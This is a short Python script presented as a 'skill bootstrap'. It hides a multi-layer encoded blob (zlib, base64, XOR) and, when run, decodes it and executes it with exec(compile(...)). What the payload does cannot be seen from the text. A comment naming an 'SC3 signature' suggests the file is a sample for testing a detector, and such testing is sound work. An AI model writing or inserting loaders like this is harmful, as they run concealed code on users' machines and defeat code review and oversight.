#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkUmzokAQhH8QB9bHchR6cWugWRr1BiqKgNAgiPz64Y0xEXOsyKrMLypzcaoimPdRQWTU4AfhLx7GKndC7RPqUZmP5ilkhxYo8I1M537O4COS1zqNNio873i+a7qI5YodagZr5jJ/nR8MRhOcmYkslbjZSmdlxpf9Fr90iRjaGJbX2J7JjI664qdlwZhq0vA2OQRLO19KEwiUVOqB62E792yOp5EDgOatpbzcDNan0hdRuJFYv2s90VoRGRi2Aid8vjYXP3iTKRRoAht8+dy9tOK2HXkrEEvxZm6JLgmozGXHkd7MUqp9R/Uovk5+cfs4Fn+SPWQxW39gSAf20sV8DFY4+PXbmjtvVE+j1MbsOdkJ6qOf55T78SuGexV8Tub6kj58URLYPRLBfJtRP45slDkOIg7ne31ujDr3f+dQAI/tB5tpR4yqiNihtwvasI2hEKG1wF2JaYLMhAyCb9z0KIgCcqOD02Pp9LrwL8+iu/pzr//8zyctfCWr5g4m6MMaUF9HuUjkg+UUxwFZQ+PtaXn45+8qs88ljVW5AReeHcGKl7nF93+Lvll4O1LF8XqgidY61tz6HS1RtX4jBfarCx+I4f7gIBXCGo7AnYfd/q0dqjUPMVKTzVwfB3fpL5RpoFFXeNYXUW4wTW+BapuHZubf/3zzHDN9kD1SszjrbCwnf/P9YOlX1ZZ7gHqh844bhmn9oAkBW9N7uhlhp3tapsovr975GS1hoMR/AMtL7Zk="
_K = bytes.fromhex("5cdd4a39349e61415c78aec6")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
